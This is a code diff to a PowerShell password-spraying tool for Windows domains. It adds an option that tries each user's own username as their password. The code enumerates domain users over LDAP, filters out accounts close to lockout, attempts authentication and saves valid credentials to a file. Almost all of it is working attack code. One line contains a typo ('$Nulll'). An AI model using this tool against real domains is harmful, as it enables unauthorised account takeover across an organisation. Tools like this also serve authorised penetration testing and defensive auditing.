@@ -42,6 +42,10 @@ function Invoke-DomainPasswordSpray{
 
     Forces the spray to continue and doesn't prompt for confirmation.
 
+    .PARAMETER UsernameAsPassword
+    
+    For each user, will try that user's name as their password
+
     .EXAMPLE
 
     C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
@@ -58,6 +62,13 @@ function Invoke-DomainPasswordSpray{
     -----------
     This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
 
+    .EXAMPLE
+
+    C:\PS> Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt
+    
+    Description
+    -----------
+    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt
 
     #>
     param(
@@ -88,10 +99,16 @@ function Invoke-DomainPasswordSpray{
      [Parameter(Position = 6, Mandatory = $false)]
      [switch]
      $Force,
-     [Parameter(Mandatory = $false)]
+
+     [Parameter(Position = 7, Mandatory = $false)]
+     [switch]     
+     $UsernameAsPassword,
+
+     [Parameter(Position = 8, Mandatory = $false)]
      [int]
      $Delay=0,
-     [Parameter(Mandatory = $false)]
+     
+     [Parameter(Position = 9, Mandatory = $false)]
      $Jitter=0
 
     )
@@ -99,6 +116,10 @@ function Invoke-DomainPasswordSpray{
     if ($Password)
     {
         $Passwords = @($Password)
+    }
+    elseif($UsernameAsPassword)
+    {
+        $Passwords = ""
     }
     elseif($PasswordList)
     {
@@ -190,15 +211,22 @@ function Invoke-DomainPasswordSpray{
     Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $Passwords.count " passwords"
     Write-Host "[*] This might take a while depending on the total number of users"
 
-
-    for($i = 0; $i -lt $Passwords.count; $i++)
+    if($UsernameAsPassword)
     {
-        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter
-        if (($i+1) -lt $Passwords.count)
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword
+    }
+    else
+    {
+        for($i = 0; $i -lt $Passwords.count; $i++)
         {
-            Countdown-Timer -Seconds (60*$observation_window)
+            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter
+            if (($i+1) -lt $Passwords.count)
+            {
+                Countdown-Timer -Seconds (60*$observation_window)
+            }
         }
     }
+    
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
     {
@@ -387,12 +415,12 @@ function Get-DomainUserList
         $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
     }
 
-    $UserSearcher.PropertiesToLoad.add("samaccountname")
-    $UserSearcher.PropertiesToLoad.add("lockouttime")
-    $UserSearcher.PropertiesToLoad.add("badpwdcount")
-    $UserSearcher.PropertiesToLoad.add("badpasswordtime")
+    $UserSearcher.PropertiesToLoad.add("samaccountname") > $Null
+    $UserSearcher.PropertiesToLoad.add("lockouttime") > $Null
+    $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
+    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Nulll
 
-    Write-Host $UserSearcher.filter
+    #Write-Host $UserSearcher.filter
 
     # grab batches of 1000 in results
     $UserSearcher.PageSize = 1000
@@ -428,7 +456,7 @@ function Get-DomainUserList
                 # or if the time since the last failed login is greater than the domain
                 # observation window add user to spray list
                 if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
-                {
+                                {
                     $UserListArray += $samaccountname
                 }
             }
@@ -455,16 +483,21 @@ function Invoke-SpraySinglePassword
             [Parameter(Position=2)]
             [string[]]
             $UserListArray,
-            [Parameter(Position=3, Mandatory=$true)]
+            [Parameter(Position=3)]
             [string]
             $Password,
             [Parameter(Position=4)]
             [string]
             $OutFile,
+            [Parameter(Position=5)]
             [int]
             $Delay=0,
+            [Parameter(Position=6)]
             [double]
-            $Jitter=0
+            $Jitter=0,
+            [Parameter(Position=7)]
+            [switch]
+            $UsernameAsPassword
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -475,6 +508,10 @@ function Invoke-SpraySinglePassword
 
     foreach ($User in $UserListArray)
     {
+        if ($UsernameAsPassword)
+        {
+            $Password = $User
+        }
         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
         if ($Domain_check.name -ne $null)
         {
